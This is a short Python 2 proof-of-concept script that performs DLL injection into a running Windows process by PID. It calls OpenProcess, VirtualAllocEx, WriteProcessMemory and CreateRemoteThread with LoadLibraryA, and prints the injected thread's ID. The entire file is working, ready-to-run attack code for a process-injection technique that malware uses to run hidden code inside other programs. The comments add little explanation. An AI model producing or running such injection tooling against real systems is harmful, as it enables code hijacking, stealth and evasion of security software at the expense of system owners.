# dll injection PoC via CreateRemoteThread from Win32 API exported by kernel32.dll

import sys
from ctypes import *

def usage():
	print """
SYNOPSIS
python dll_injection_PoC.py <pid> <path/to/dll> 
"""

if len(sys.argv) != 3:
    usage()
    sys.exit(0)

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
pid = sys.argv[1]
dll_path = sys.argv[2]
dll_len = len(dll_path)

# obtain an handle to the process we are going to inject our dll
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*] Couldn't find PID: %s or couldn't acquire handle" % pid
    sys.exit(0)

# allocate enough memory to the dll path we are going to inject
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# write the dll path to the new allocated memory
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

# resolve memory address for LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib  = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")

# call CreateRemoteThread with the entry point set to LoadLibraryA and a pointer to the DLL path
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print "[*] Failed to inject the DLL into memory."
    sys.exit(0)

print "[*] DLL injection successfull (thread ID: 0x%08x)" % thread_id.value
